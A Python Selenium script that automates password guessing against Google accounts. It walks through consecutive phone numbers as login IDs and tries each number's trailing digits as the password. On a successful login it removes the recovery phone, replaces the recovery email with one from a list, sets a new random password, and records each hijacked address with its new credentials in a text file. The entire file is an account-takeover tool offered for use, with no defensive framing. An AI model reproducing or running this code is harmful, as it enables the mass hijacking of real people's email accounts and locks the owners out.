import os
import socket
import random
import requests
import subprocess
from time import sleep
import undetected_chromedriver as uc
from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities


if __name__ == '__main__':
    phone = int(input("Enter starting number: "))
    cutecode = int(input("Cut from first: "))

    opts = uc.ChromeOptions()
    opts.add_argument(f'--incognito')
    driver = uc.Chrome(options=opts)
    driver.set_window_size(600, 600)

    while True:
        ccode = cutecode
        mphone = phone
        pword = str(mphone)
        length = len(pword)
        cutnum = ccode-length
        password = pword[cutnum:]

        with open("lastNumber.txt", "w") as file1:
            file1.write(str(mphone))


        try:
            socket.create_connection(("www.google.com", 80))
            driver.get(r'https://accounts.google.com/v3/signin/identifier?dsh=S-1391890192%3A1664291962435973&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWouqy_lR9nx32ijc_hI9RWGO-Hcb8kKZhz98D2f7OaYVDZCjHQ2G0dMBPlLGkgNyJQ_ZTV3og')
            #print("Internet Conneted.")
            driver.find_element(By.XPATH, '//*[@id="identifierId"]').send_keys(mphone)
            driver.find_element(By.XPATH, '//*[@id="identifierNext"]/div/button/span').click()
            sleep(3)
            #timeout = 5
            #element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input')))
            try:
                #element_present = EC.presence_of_element_located((By.ID, 'password'))
                #WebDriverWait(driver, timeout).until(element_present)
               # WebDriverWait(driver, 5).until(EC.presence_of_element_located(
                    #(By.XPATH,  '//*[@id="password"]/div[1]/div/div[1]/input')))
                driver.find_element(By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input').send_keys(password)
                driver.find_element(By.XPATH, '//*[@id="passwordNext"]/div/button/span').click()
                sleep(2)

                try:
                    driver.get('https://myaccount.google.com/signinoptions/rescuephone')
                    sleep(2)
                    get_url1 = driver.current_url
                    urlss = len(get_url1)
                    cutnums = 54-urlss
                    urlrt = get_url1[cutnums:]
                    #print(urlrt)

                    mailpage = 'https://myaccount.google.com/recovery/email'
                    passpage = 'https://myaccount.google.com/signinoptions/password'
                    fainalmailpage = mailpage + urlrt
                    fainalpasspage = passpage + urlrt
                    #print(fainalmailpage)

                    recoverymailfile = open("recoverymail.txt").read().splitlines()
                    recoverymail = random.choice(recoverymailfile)

                    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@#$%^&*()"
                    setpassword = ""
                    for i in range(12):
                        setpassword += random.choice(characters)
                    #print(setpassword)

                    try:
                        #ttesst = driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[3]/div[1]/c-wiz/div/div/div/div/div/div[2]/div[2]/span/span/span')
                        #if ttesst:
                        #print('Number')
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[3]/div[1]/c-wiz/div/div/div/div/div/div[2]/div[2]/span/span/span').click()
                        sleep(2)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/div[12]/div/div[2]/div[3]/div[2]/span/span').click()
                        sleep(2)

                        driver.get(fainalmailpage)
                        driver.find_element(By.XPATH, '//*[@id="i5"]').clear()
                        driver.find_element(By.XPATH, '//*[@id="i5"]').send_keys(recoverymail)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[4]/div/form/div/div[2]/div[2]/div/button/span').click()
                        sleep(3)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/div[12]/div[2]/div/div[2]/button[1]').click()
                        sleep(2)
                        driver.get(fainalpasspage)
                        driver.find_element(By.XPATH, '//*[@id="i6"]').send_keys(setpassword)
                        driver.find_element(By.XPATH, '//*[@id="i12"]').send_keys(setpassword)
                        sleep(3)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[4]/form/div/div[2]/div/div/button/div[1]').click()
                        sleep(2)
                        driver.get('https://myaccount.google.com/email')
                        emails = driver.find_element(By.CLASS_NAME, 'mMsbvc').text
                        print(emails)
                        sleep(3)
                        with open("fainalmail.txt", "a") as file1:
                            file1.write(emails +"      "+ setpassword + "      " + recoverymail + "\n" )
                            sleep(2)

                    except:
                        #print('No Number')
                        driver.get(fainalmailpage)
                        driver.find_element(By.XPATH, '//*[@id="i5"]').clear()
                        driver.find_element(By.XPATH, '//*[@id="i5"]').send_keys(recoverymail)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[4]/div/form/div/div[2]/div[2]/div/button/span').click()
                        sleep(3)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/div[12]/div[2]/div/div[2]/button[1]').click()
                        sleep(2)
                        driver.get(fainalpasspage)
                        driver.find_element(By.XPATH, '//*[@id="i6"]').send_keys(setpassword)
                        driver.find_element(By.XPATH, '//*[@id="i12"]').send_keys(setpassword)
                        sleep(3)
                        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div[2]/c-wiz/div/div[4]/form/div/div[2]/div/div/button/span').click()
                        sleep(2)
                        driver.get('https://myaccount.google.com/email')
                        emails = driver.find_element(By.CLASS_NAME, 'mMsbvc').text
                        print(emails)
                        sleep(3)
                        with open("fainalmail.txt", "a") as file1:
                            file1.write(emails + "      " + setpassword + "      " + recoverymail + "\n")
                            sleep(2)

                except:
                    print("Some Problem to add recovery")

            except NoSuchElementException:
                print("Try other: " +  str(mphone) )
            except TimeoutException:
                continue
                print("Time Out")
            except:
                print("Other problem")

        except OSError:
            print("No net")
            continue
        except TimeoutException:
            continue
            print( "Time out")
        except:
            print("Other problem")

        driver.delete_all_cookies()
        phone = phone + 1

